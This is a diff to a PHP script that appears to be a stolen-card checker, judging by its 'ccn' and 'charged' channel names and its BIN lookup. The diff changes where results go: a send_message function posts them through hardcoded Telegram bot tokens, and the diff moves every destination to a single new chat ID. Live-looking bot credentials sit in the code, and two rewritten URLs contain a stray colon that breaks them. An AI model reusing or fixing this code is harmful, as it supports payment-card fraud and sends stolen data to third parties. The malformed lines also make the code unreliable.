@@ -48,9 +48,9 @@ if (strlen($ano) == 2) $ano = "20$ano";
 
 
 $userid = $_GET['bot'];
-$userid2 = "@chargedbydarkphoenix";
-$userid3 = "-1001811947326";
-$userid4 = "@ccnbydarkphoenix";
+$userid2 = "-1001768382602";
+$userid3 = "-1001768382602";
+$userid4 = "-1001768382602";
 
 
 //================= [ Bin REQUESTS ] =================//
@@ -72,10 +72,10 @@ $bank = $response["bank"]["name"];
 
 function send_message($userid, $msg) {
 $text = urlencode($msg);
-file_get_contents("https://api.telegram.org/bot5929089968:AAFVBq4UvQfYTKyvpfTWSByIVG_P92Ahd8s/sendMessage?chat_id=$userid&text=$text&parse_mode=HTML");
-file_get_contents("https://api.telegram.org/bot5929089968:AAFVBq4UvQfYTKyvpfTWSByIVG_P92Ahd8s/sendMessage?chat_id=$userid2&text=$text&parse_mode=HTML");
-file_get_contents("https://api.telegram.org/bot5929089968:AAFVBq4UvQfYTKyvpfTWSByIVG_P92Ahd8s/sendMessage?chat_id=$userid3&text=$text&parse_mode=HTML");
-file_get_contents("https://api.telegram.org/bot5929089968:AAFVBq4UvQfYTKyvpfTWSByIVG_P92Ahd8s/sendMessage?chat_id=$userid4&text=$text&parse_mode=HTML");
+file_get_contents("https://api.telegram.org/bot6327147137:AAEY15sQLpZNE10nRSKzAIxULH0xu54BRhU/sendMessage?chat_id=$userid&text=$text&parse_mode=HTML");
+file_get_contents("https://api.telegram.org/bot6327147137:AAEY15sQLpZNE10nRSKzAIxULH0xu54BRhU/sendMessage?chat_id=$userid2&text=$text&parse_mode=HTML");
+file_get_contents("https://api.telegram.org/bot6327147137:AAEY15sQLpZNE10nRSKzAIxULH0xu54BRhU:/sendMessage?chat_id=$userid3&text=$text&parse_mode=HTML");
+file_get_contents("https://api.telegram.org/bot6327147137:AAEY15sQLpZNE10nRSKzAIxULH0xu54BRhU:/sendMessage?chat_id=$userid4&text=$text&parse_mode=HTML");
 };
 
 #-------------------[1st REQ]--------------------#
